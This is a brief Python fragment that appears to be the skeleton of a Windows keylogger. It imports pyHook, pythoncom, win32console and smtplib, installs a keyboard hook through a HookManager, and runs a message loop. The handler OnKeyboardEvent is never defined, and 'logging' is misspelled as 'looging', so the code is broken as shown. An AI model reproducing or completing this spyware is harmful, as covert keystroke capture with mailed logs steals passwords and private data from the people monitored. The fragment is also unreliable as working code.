import pyHook,sys,looging,pythoncom,win32console
import smtplib
import os

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
